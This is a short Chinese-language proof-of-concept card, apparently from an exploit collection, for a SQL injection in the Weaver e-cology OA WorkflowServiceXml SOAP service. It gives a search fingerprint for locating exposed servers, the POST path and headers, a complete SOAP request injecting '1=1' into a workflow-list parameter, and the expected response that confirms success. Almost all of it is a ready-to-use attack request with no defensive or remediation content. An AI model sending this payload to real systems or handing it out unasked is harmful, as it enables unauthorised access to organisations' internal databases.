# 泛微e-cologyWorkflowServiceXmlSQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`POST /services/WorkflowServiceXml HTTP/1.1`
- **关键头**：`Content-Length: 475`　`Content-Type: text/xml`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
<soapenv:Body>
<web:getHendledWorkflowRequestList>
<web:in0>1</web:in0>
<web:in1>1</web:in1>
<web:in2>1</web:in2>
<web:in3>1</web:in3>
<web:in4>
<web:string>1=1</web:string>
</web:in4>
</web:getHendledWorkflowRequestList>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　WorkflowRequestInfo>